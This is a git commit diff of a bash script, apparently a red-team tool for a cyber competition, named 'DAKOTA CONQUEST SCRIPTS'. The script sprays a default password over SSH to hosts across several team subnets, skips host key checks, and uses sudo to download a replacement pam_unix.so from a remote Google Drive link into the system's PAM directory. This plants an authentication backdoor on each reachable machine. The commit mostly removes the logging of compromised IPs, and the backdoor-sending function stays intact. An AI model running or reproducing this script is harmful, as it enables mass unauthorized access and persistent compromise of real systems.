9711e07ea181a94a83e9697835d7dc06172857c4
sawyer3399 <46585978+sawyer3399@users.noreply.github.com>
2025-03-18 15:31:47 -0500

    Update script.sh

--- script.sh
+++ script.sh
@@ -5,40 +5,22 @@ network_id="10.20"
 number_of_teams=10
 host_ids=(111 121 131)
 default_password="Password1!"
-timeout_duration=2
+timeout_duration=3
 path_to_pam="/usr/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
-touch backdoored_IPs.txt
 
 send_backdoor() {
     read -p "Username: " username
-
+    
     export default_password timeout_duration username path_to_pam backdoor_link
-    printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
+
+    echo "${IPs[@]}" | xargs -P 20 -I {} bash -c '
         IP="{}"
         sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
             echo \"$default_password\" | sudo -S apt install curl -y
             echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
         "
-        if [[ $? -eq 0 ]]; then
-            echo "$IP" >> backdoored_IPs.txt
-            echo "Backdoor successfully implanted at $IP"
-        fi
     '
-}
-
-print_backdoored_IPs() {
-    echo "Backdoored IPs:"
-    cat backdoored_IPs.txt
-}
-
-print_unbackdoored_IPs() {
-    echo "Unbackdoored IPs:"
-    for IP in "${IPs[@]}"; do
-        if ! grep -q "$IP" backdoored_IPs.txt; then
-            echo "$IP"
-        fi
-    done
 }
 
 main() {
@@ -47,21 +29,17 @@ main() {
             IPs+=("$network_id.$team.$host_id")
         done
     done
-
+    
     while true; do
         echo "DAKOTA CONQUEST SCRIPTS"
         echo "1. Send Backdoor"
-        echo "2. Print Backdoored IPs"
-        echo "3. Print Unbackdoored IPs"
-        echo "4. Exit"
+        echo "2. Exit"
         read -p "Choose an option: " choice
 
         case $choice in
             1) send_backdoor ;;
-            2) print_backdoored_IPs ;;
-            3) print_unbackdoored_IPs ;;
-            4) break ;;
-            *) echo "Invalid choice. Please try again." ;;
+            2) break ;;
+            *) echo "Invalid choice." ;;
         esac
     done
 }
